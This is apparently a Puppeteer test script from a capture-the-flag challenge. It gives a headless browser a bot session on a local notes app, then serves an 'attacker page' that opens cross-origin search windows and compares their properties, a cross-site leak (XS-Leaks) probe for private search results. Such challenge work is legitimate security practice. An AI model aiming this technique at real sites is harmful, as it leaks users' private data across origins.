const path = require("path");
const puppeteer = require(path.resolve(__dirname, "../challenge_mouse/bot/node_modules/puppeteer-core"));
const http = require("http");

(async () => {
  const browser = await puppeteer.launch({
    headless: "new",
    executablePath: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    args: ["--no-sandbox", "--disable-dev-shm-usage"]
  });

  const page = await browser.newPage();

  // Setup bot session
  await page.setExtraHTTPHeaders({ "X-Bot-Token": "bot-token" });
  await page.goto("http://127.0.0.1:3000/bot/session", { waitUntil: "domcontentloaded" });
  await page.setExtraHTTPHeaders({});

  // Serve attacker page on port 9876
  const server = http.createServer((req, res) => {
    res.setHeader("Content-Type", "text/html");
    res.end(`<!doctype html>
<html>
<body>
<div id="log"></div>
<script>
window.testResults = {};
async function run() {
  // Test opening 200 (match 'f') vs 404 (nomatch '0')
  const w1 = window.open("http://127.0.0.1:3000/notes?search=8", "win1");
  await new Promise(r => setTimeout(r, 1000));

  const w2 = window.open("http://127.0.0.1:3000/notes?search=0", "win2");
  await new Promise(r => setTimeout(r, 1000));

  window.testResults = {
    w1: {
      closed: w1.closed,
      length: w1.length,
      name: w1.name
    },
    w2: {
      closed: w2.closed,
      length: w2.length,
      name: w2.name
    }
  };
}
run();
</script>
</body>
</html>`);
  });

  await new Promise(r => server.listen(9876, r));
  await page.goto("http://127.0.0.1:9876/", { waitUntil: "domcontentloaded" });
  await new Promise(r => setTimeout(r, 3000));

  const results = await page.evaluate(() => window.testResults);
  console.log("Window test results:", results);

  await browser.close();
  server.close();
})();
